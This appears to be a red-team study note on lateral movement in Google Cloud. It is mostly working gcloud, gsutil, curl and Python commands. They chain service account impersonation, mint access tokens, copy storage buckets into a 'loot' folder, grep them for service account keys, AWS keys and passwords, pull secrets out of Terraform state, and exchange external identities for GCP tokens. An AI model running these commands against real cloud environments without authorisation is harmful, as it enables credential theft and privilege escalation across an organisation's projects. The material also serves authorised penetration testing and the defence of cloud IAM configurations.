# 06.4 — GCP Lateral Movement

## What This Note Covers

Moving laterally within GCP — service account impersonation chains, GCS as a pivot source, workload identity hopping, org-level movement across projects, and using BloodHound for GCP paths.

---

## Service Account Impersonation Chains

The core GCP lateral movement primitive. Each hop uses a more privileged service account as a stepping stone.

```bash
# Step 1: List all service accounts in the project
gcloud iam service-accounts list --project PROJECT_ID

# Step 2: For each SA, check if you have actAs or tokenCreator permission
for SA in $(gcloud iam service-accounts list \
  --project PROJECT_ID --format="value(email)"); do
  POLICY=$(gcloud iam service-accounts get-iam-policy $SA \
    --project PROJECT_ID --format=json 2>/dev/null)
  # Check if your identity appears in the policy
  echo $POLICY | python3 -c "
import sys, json
data = json.load(sys.stdin)
for b in data.get('bindings', []):
    if any('YOUR_IDENTITY' in m for m in b.get('members', [])):
        print(f'CAN {b[\"role\"]} on: $SA')
" 2>/dev/null
done

# Step 3: Impersonate a SA you have actAs on
gcloud auth print-access-token \
  --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com

# Step 4: Check what that SA can do
TOKEN=$(gcloud auth print-access-token \
  --impersonate-service-account=TARGET_SA@PROJECT.iam.gserviceaccount.com)

curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"

# Step 5: From the impersonated SA, can it impersonate another SA?
gcloud iam service-accounts get-iam-policy NEXT_SA@PROJECT.iam.gserviceaccount.com \
  --project PROJECT_ID
# If TARGET_SA has actAs on NEXT_SA → chain continues
```

### Token Creator Chain

```bash
# Generate a token for a target SA (requires iam.serviceAccounts.getAccessToken)
TOKEN=$(gcloud auth print-access-token)  # your current token

curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"scope": ["https://www.googleapis.com/auth/cloud-platform"]}' \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT.iam.gserviceaccount.com:generateAccessToken" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['accessToken'])"

# Use the generated token
NEW_TOKEN="ya29..."
curl -H "Authorization: Bearer $NEW_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

## GCS Bucket as Lateral Movement Source

GCS buckets frequently contain credentials for other services — SA key files, Terraform state, application configs, and CI/CD artifacts.

```bash
# Enumerate all buckets in the project
gsutil ls -p PROJECT_ID

# List all objects in each bucket
for BUCKET in $(gsutil ls -p PROJECT_ID); do
  echo "=== $BUCKET ==="
  gsutil ls -r $BUCKET 2>/dev/null | head -20
done

# Look for high-value files
gsutil ls -r gs://BUCKET/ | grep -iE \
  "\.json|terraform|tfstate|\.env|credentials|key|secret|password|config"

# Download and search everything
gsutil cp -r gs://BUCKET/ ./loot/
grep -r '"type": "service_account"' ./loot/  # SA key files
grep -r 'aws_access_key_id\|aws_secret' ./loot/  # AWS credentials
grep -r 'password\|secret\|api_key' ./loot/ --include="*.json" --include="*.env"

# Terraform state files are the highest value
find ./loot/ -name "terraform.tfstate" -exec python3 -c "
import json, sys
state = json.load(open('{}'))
for r in state.get('resources', []):
    for i in r.get('instances', []):
        for k, v in i.get('attributes', {}).items():
            if any(s in k.lower() for s in ['password','secret','key','token']):
                print(f'{r[\"type\"]}.{r[\"name\"]}.{k}: {v}')
" \;
```

## Cross-Project Lateral Movement

GCP projects are not fully isolated from each other when shared VPCs, shared service accounts, or org-level IAM is in use.

```bash
# Step 1: List all projects accessible to the current identity
gcloud projects list

# Step 2: For each project, check the IAM policy for your identity or SAs you control
for PROJECT in $(gcloud projects list --format="value(projectId)"); do
  echo "=== $PROJECT ==="
  gcloud projects get-iam-policy $PROJECT \
    --flatten="bindings[].members" \
    --filter="bindings.members:YOUR_IDENTITY OR bindings.members:SA_YOU_CONTROL" \
    --format="table(bindings.role)" 2>/dev/null
done

# Step 3: Check if any SA you can impersonate has cross-project roles
# An SA in Project A may have roles in Project B
for PROJECT in $(gcloud projects list --format="value(projectId)"); do
  POLICY=$(gcloud projects get-iam-policy $PROJECT --format=json 2>/dev/null)
  echo $POLICY | python3 -c "
import sys, json
data = json.load(sys.stdin)
for b in data.get('bindings', []):
    for m in b.get('members', []):
        if 'TARGET_SA_EMAIL' in m:
            print(f'Project: $PROJECT | Role: {b[\"role\"]} | Member: {m}')
" 2>/dev/null
done
```

## Org-Level Lateral Movement

If you have org-level IAM visibility or permissions, you can survey and access all projects.

```bash
# List all projects in the org (requires resourcemanager.projects.list at org level)
gcloud projects list --filter="parent.id=ORG_ID AND parent.type=organization"

# Get org-level IAM policy
gcloud organizations get-iam-policy ORG_ID

# Check if your identity or controlled SAs have org-level roles
gcloud organizations get-iam-policy ORG_ID \
  --flatten="bindings[].members" \
  --filter="bindings.members:YOUR_IDENTITY" \
  --format="table(bindings.role)"

# If you find roles/resourcemanager.projectViewer at org level:
# You can read all project IAM policies → map the entire org's permission graph
for PROJECT in $(gcloud projects list --format="value(projectId)"); do
  echo "=== $PROJECT ==="
  gcloud projects get-iam-policy $PROJECT --format=json 2>/dev/null | \
    python3 -c "
import sys,json
data=json.load(sys.stdin)
for b in data.get('bindings',[]):
    if any(r in b['role'] for r in ['owner','editor','admin']):
        print(b['role'], b['members'])
"
done
```

## Workload Identity Federation — Cross-Environment Pivot

If a GCP workload identity pool trusts an external identity (GitHub Actions, AWS IAM, Azure AD), and the condition is overly broad, an attacker with that external identity can impersonate GCP service accounts.

```bash
# List workload identity pools
gcloud iam workload-identity-pools list \
  --location global --project PROJECT_ID

# Describe a pool and its providers (look for broad attribute conditions)
gcloud iam workload-identity-pools providers describe PROVIDER_ID \
  --workload-identity-pool POOL_ID \
  --location global \
  --project PROJECT_ID

# Check which SAs trust the pool (look for workloadIdentityUser bindings)
gcloud iam service-accounts get-iam-policy SA_EMAIL \
  --project PROJECT_ID | grep -A5 "workloadIdentityUser\|principalSet"

# If the pool trusts AWS IAM (and you have an AWS identity):
# Exchange AWS credentials for a GCP token
aws sts get-caller-identity  # get your AWS identity

# Then use the WIF exchange endpoint
curl -X POST \
  "https://sts.googleapis.com/v1/token" \
  -H "Content-Type: application/json" \
  -d '{
    "audience": "//iam.googleapis.com/projects/PROJECT_NUM/locations/global/workloadIdentityPools/POOL_ID/providers/PROVIDER_ID",
    "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
    "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
    "scope": "https://www.googleapis.com/auth/cloud-platform",
    "subjectTokenType": "urn:ietf:params:aws:token-type:aws4_request",
    "subjectToken": "AWS_SIGNED_REQUEST"
  }'
```

## BloodHound for GCP (via ScoutSuite + Manual Analysis)

There isn't a single BloodHound-equivalent for GCP yet, but the GCP IAM Privilege Escalation tool and manual analysis serve the same purpose.

```bash
# Map the entire IAM graph manually
# Step 1: Export all project IAM policies to a single file
for PROJECT in $(gcloud projects list --format="value(projectId)"); do
  gcloud projects get-iam-policy $PROJECT --format=json 2>/dev/null \
    | python3 -c "
import sys, json
data = json.load(sys.stdin)
for b in data.get('bindings', []):
    for m in b.get('members', []):
        print(f'$PROJECT,{b[\"role\"]},{m}')
"
done > /tmp/gcp-iam-graph.csv

# Step 2: Analyse for impersonation chains
grep "serviceAccount" /tmp/gcp-iam-graph.csv | \
  grep "iam.serviceAccountUser\|iam.serviceAccountTokenCreator"

# Step 3: For any SA that can impersonate another SA:
# Check what that target SA can do → find the chain
```
